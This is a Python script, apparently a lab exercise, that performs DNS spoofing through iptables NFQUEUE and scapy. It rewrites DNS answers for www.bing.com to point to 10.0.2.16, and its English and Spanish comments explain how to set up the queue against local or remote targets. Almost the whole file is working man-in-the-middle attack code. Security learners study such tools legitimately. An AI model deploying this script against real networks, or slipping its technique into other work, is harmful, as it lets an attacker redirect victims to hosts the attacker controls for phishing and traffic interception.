import scapy.all as scapy
import netfilterqueue


# First, you have to create a queue 'iptables -I FORWARD -j NFQUEUE --queue-num 0'
# Lastly, you have to delete the created queue to restore the internet access. 'iptables --flush'

### iptables -I OUTPUT -j NFQUEUE --queue-num 0 | Packets leaving my computer | if you are targeting a local computer, you have to redirect input and output chains as well.
# La primera regla, "iptables -I OUTPUT -j NFQUEUE --queue-num 0", redirigirá 
# los paquetes que salen de tu ordenador (paquetes de salida) a la cola de Netfilter número 0. 
# Por lo tanto, los paquetes que salen de tu ordenador pasarán por la cola de Netfilter antes de que se envíen a su destino.


## iptables -I INPUT -j NFQUEUE --queue-num 0 | packets coming to my computer | use it if you are ONLY targeting a remote computer

# segunda regla, "iptables -I INPUT -j NFQUEUE --queue-num 0", redirigirá 
# los paquetes que llegan a tu ordenador (paquetes de entrada) a la cola de Netfilter número 0. 
# Por lo tanto, los paquetes que llegan a tu ordenador pasarán por la cola de Netfilter antes de ser entregados a su destino final.


def packet_process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    
    packet.accept()  # Accept packets


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packet_process)
queue.run()



